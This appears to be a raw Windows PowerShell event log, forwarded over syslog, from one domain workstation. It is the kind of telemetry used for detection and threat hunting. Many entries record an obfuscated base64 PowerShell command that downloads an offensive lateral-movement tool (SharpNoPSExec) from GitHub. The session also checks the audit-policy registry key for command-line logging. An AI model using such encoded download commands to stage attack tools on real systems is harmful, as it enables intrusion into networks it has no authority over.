<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9608,"ActivityID":"{66883D06-FD3B-0001-276C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 9e87d9b3-f32a-40e1-947f-fa83963071c2\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"9e87d9b3-f32a-40e1-947f-fa83963071c2","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9612,"ActivityID":"{66883D06-FD3B-0001-2A6C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 1903ce3f-6eeb-4a3f-87b1-3c5b355cc9d3\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"1903ce3f-6eeb-4a3f-87b1-3c5b355cc9d3","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":600,"SourceName":"PowerShell","Version":0,"Task":6,"OpcodeValue":0,"RecordNumber":4344,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Provider \"Variable\" is Started. \r\n\r\nDetails: \r\n\tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Provider Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9619,"ActivityID":"{66883D06-FD3B-0000-9470-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 684ec48b-19cd-4186-9bdd-0458b422b0ad\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"684ec48b-19cd-4186-9bdd-0458b422b0ad","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4346,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:                                   $result = (Get-ItemProperty -LiteralPath $_.PSPath |\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=15\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                                  $result = (Get-ItemProperty -LiteralPath $_.PSPath |\r\n \r\n\r\nDetails: \r\nCommandInvocation(Get-ItemProperty): \"Get-ItemProperty\"\r\nParameterBinding(Get-ItemProperty): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\nCommandInvocation(Select-Object): \"Select-Object\"\r\nParameterBinding(Select-Object): name=\"ExcludeProperty\"; value=\"PSPath, PSParentPath, PSChildName, PSDrive, PsProvider\"\r\nParameterBinding(Select-Object): name=\"Property\"; value=\"*\"\r\nCommandInvocation(Format-List): \"Format-List\"\r\nCommandInvocation(Out-String): \"Out-String\"\r\nCommandInvocation(Sort-Object): \"Sort-Object\"\r\nParameterBinding(Select-Object): name=\"InputObject\"; value=\"@{ProcessCreationIncludeCmdLine_Enabled=1; PSPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit; PSParentPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system; PSChildName=audit; PSProvider=Microsoft.PowerShell.Core\\Registry}\"\r\nParameterBinding(Format-List): name=\"InputObject\"; value=\"@{ProcessCreationIncludeCmdLine_Enabled=1}\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatStartData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.GroupStartData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.GroupEndData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatEndData\"\r\nParameterBinding(Sort-Object): name=\"InputObject\"; value=\"\r\n\r\nProcessCreationIncludeCmdLine_Enabled : 1\r\n\r\n\r\n\r\n\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4336,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=74\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=11\r\n\tCommandName=\r\n\tCommandType=Script\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4335,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line: . \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=72\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=10\r\n\tScriptName=\r\n\tCommandLine= \r\n\r\nDetails: \r\nCommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4352,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Out-Default\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=23\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n\tPipelineId=1\r\n\tCommandName=Out-Default\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9610,"ActivityID":"{66883D06-FD3B-0001-286C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 200f9d67-a3b7-40f0-b3c0-621a4e129541\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"200f9d67-a3b7-40f0-b3c0-621a4e129541","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":600,"SourceName":"PowerShell","Version":0,"Task":6,"OpcodeValue":0,"RecordNumber":4339,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Provider \"Registry\" is Started. \r\n\r\nDetails: \r\n\tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Provider Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":600,"SourceName":"PowerShell","Version":0,"Task":6,"OpcodeValue":0,"RecordNumber":4343,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Provider \"Function\" is Started. \r\n\r\nDetails: \r\n\tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Provider Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9622,"ActivityID":"{66883D06-FD3B-0001-276C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: fa317e03-8852-4861-ad13-a6b6cf15b53d\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"fa317e03-8852-4861-ad13-a6b6cf15b53d","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4351,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"out-lineoutput\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=22\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n\tPipelineId=1\r\n\tCommandName=out-lineoutput\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4350,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"format-default\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=21\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n\tPipelineId=1\r\n\tCommandName=format-default\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":400,"SourceName":"PowerShell","Version":0,"Task":4,"OpcodeValue":0,"RecordNumber":4345,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Engine state is changed from None to Available. \r\n\r\nDetails: \r\n\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Engine Lifecycle","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":53504,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":111,"OpcodeValue":10,"RecordNumber":9603,"ActivityID":"{66883D06-FD3B-0000-8B70-28DDCE92D801}","ProcessID":5148,"ThreadID":1496,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Windows PowerShell has started an IPC listening thread on process: 5148 in AppDomain: DefaultAppDomain.","Category":"PowerShell Named Pipe IPC","Opcode":"Open (async)","param1":"5148","param2":"DefaultAppDomain","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:42 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4353,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line: . \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=24\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine= \r\n\r\nDetails: \r\nCommandInvocation(Out-Default): \"Out-Default\"\r\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657287762,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9606,"ActivityID":"{66883D06-FD3B-0000-8D70-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: fa317e03-8852-4861-ad13-a6b6cf15b53d\r\nRunspace ID: 5f2a817b-a28d-42f5-9e5e-2bfaba03c780","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"fa317e03-8852-4861-ad13-a6b6cf15b53d","RunspaceId":"5f2a817b-a28d-42f5-9e5e-2bfaba03c780","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
